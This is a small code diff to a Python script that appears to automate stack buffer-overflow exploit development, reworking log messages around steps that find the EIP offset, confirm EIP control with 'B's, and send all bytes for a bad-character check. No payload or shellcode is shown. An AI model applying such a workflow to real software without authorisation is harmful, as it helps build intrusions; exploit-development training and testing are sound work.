@@ -57,16 +57,16 @@ class Main:
             
             # Determine EIP offset
             offset = self.get_offset(eip_query)
+            
+            print(f"[*] Offset detected at {offset} bytes\n")
 
-            print("[*] Targeting EIP with all 'B's...")
+            print("[*] Targeting EIP with all 'B's...\n")
             fuzz.confirm_eip(offset)
-
-            print(f"[*] Offset at: {offset}\n")
 
             print("[!] Waiting for application to restart.\n")
             fuzz.is_target_up()
 
-            print("[*] Sending all characters...\n")
+            print("[*] Sending all chars for bad char check...\n")
             fuzz.check_bad_chars(offset)
             sys.exit()
 
